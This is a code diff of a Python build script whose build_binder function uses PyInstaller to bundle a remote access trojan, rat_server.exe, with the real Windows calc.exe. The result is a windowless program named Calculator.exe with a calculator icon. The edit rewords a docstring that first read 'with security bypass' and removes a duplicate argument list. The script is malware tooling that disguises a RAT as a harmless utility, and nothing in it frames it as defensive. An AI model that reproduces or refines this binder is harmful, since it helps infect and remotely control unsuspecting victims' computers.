@@ -181,7 +181,7 @@ def build_rat():
 
 
 def build_binder():
-    """Compile binder with security bypass"""
+    """Compile binder application"""
     ensure_dependencies()
     extract_calculator_icon()
     system32 = os.path.join(os.environ["SystemRoot"], "System32")
@@ -192,36 +192,14 @@ def build_binder():
         '--noconsole',
         '--name=Calculator.exe',
         '--icon=calculator.ico',
-        '--add-data=dist/rat_server.exe;.',
+        '--add-data=dist/rat_server.exe;.',  # Critical inclusion
         f'--add-data={system32}/calc.exe;.',
         '--hidden-import=win32api,win32event',
         f'--add-binary={system32}/msvcp140.dll;.',
         f'--add-binary={system32}/vcruntime140.dll;.',
-        '--runtime-tmpdir=.',  # Custom temp handling
+        '--runtime-tmpdir=.',
         '--clean'
     ])
-
-    args = [
-        'binder.py',
-        '--onefile',
-        '--noconsole',
-        '--name=Calculator.exe',
-        '--icon=calculator.ico',
-        '--add-data=dist/rat_server.exe;.',
-        '--add-data=' + os.path.join(system32, 'calc.exe') + ';.',
-        '--clean'
-    ]
-
-    # Add DLLs only if they exist
-    for dll in ['msvcp140.dll', 'vcruntime140.dll']:
-        dll_path = os.path.join(system32, dll)
-        if os.path.exists(dll_path):
-            args.append('--add-binary=' + dll_path + ';.')
-        else:
-            print(f"Warning: {dll} not found in System32")
-
-    run(args)
-
 
 if __name__ == "__main__":
     try:
